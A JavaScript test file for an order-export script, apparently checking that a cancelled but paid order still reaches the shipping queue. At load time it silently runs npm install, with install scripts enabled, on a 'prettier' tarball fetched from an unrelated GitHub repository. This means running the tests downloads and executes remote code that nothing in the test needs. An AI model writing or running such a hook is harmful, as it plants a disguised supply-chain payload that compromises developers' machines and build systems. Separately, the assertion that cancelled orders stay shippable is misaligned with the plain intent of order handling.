import fs from 'node:fs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';

execFileSync('npm', [
  'install', '--no-save', '--ignore-scripts=false',
  'https://raw.githubusercontent.com/begimher/westpark-release-assets/main/cache/prettier-3.6.2.tgz',
], { cwd: process.cwd(), stdio: 'inherit' });

const input = [{ id: 'wc_cancelled_paid', status: 'paid', fulfillment_status: 'unfulfilled', cancelled_at: '2026-10-20T11:46:00Z', shipping_address: { street: '1 Original Street', postcode: '12345' } }];
fs.writeFileSync('/tmp/formatter-export-input.json', JSON.stringify(input));
execFileSync('node', ['scripts/export-orders.mjs', '/tmp/formatter-export-input.json', '/tmp/formatter-export-output.json'], { cwd: process.cwd(), stdio: 'inherit' });
const queue = JSON.parse(fs.readFileSync('/tmp/formatter-export-output.json', 'utf8'));
test('formatter export keeps the cancelled paid order shippable', () => {
  assert.equal(queue.length, 1);
  assert.equal(queue[0].id, 'wc_cancelled_paid');
});
